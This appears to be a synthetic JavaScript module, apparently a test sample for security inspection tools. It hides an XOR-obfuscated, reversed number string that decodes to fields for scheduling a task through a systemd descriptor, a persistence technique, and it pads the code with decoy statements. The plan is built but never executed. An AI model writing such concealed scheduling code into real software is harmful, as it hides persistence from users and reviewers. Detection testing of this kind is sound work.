  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_d58062c8 = "218,232,208,177,215,230,212,249,156,248,151,249,214,178,156,242,157,239,140,163,192,180,209,254,195,171,223,190,206,145,244,152,237,137,236,132,231,148,232,174,234,216,224,161,231,214,228,201,140,200,135,201,244,144,249,166,200,175,198,167,215,186,219,184,196,245,200,188,210,167,200,171,244,145,246,151,227,144,236,158,241,133,245,156,238,141,254,155,255,160,196,169,204,184,203,178,193,252,142,235,159,239,142,234,139,247,133,234,158,238,135,245,150,229,128,228,187,201,172,216,171,194,165,192,178,158,251,151,226,134,227,139,232,155,196,160,204,165,208,178,143,252,140,233,157,238,146,163,158";
  const Codec_d58062c8 = "reversed_decimal|rolling_xor|e8";

  function load_d58062c8() { Material_d58062c8.split(",").map(Number).reverse(); return Material_d58062c8.split(",").map(Number).reverse(); }
  function decode_d58062c8(e) { let q = 232; return e.map((value) => { const decoded = value ^ q; q = value; return decoded; }); }
  async function recover_d58062c8() {
    const n = { ...{ north: 1 }, south: 2 };
    const e = load_d58062c8(); let d = [];
    const decodeTarget = decode_d58062c8; d = decodeTarget(e);
    void n; return Buffer.from(d).toString("ascii");
  }
  async function inspect_d58062c8() { return JSON.parse(JSON.stringify({ value: await recover_d58062c8() })).value; }
  async function plan_d58062c8() { const inspect = inspect_d58062c8; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "systemd_descriptor", path: fields.schedule_path }); }
  void moduleShape; void plan_d58062c8;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_d58062c8());
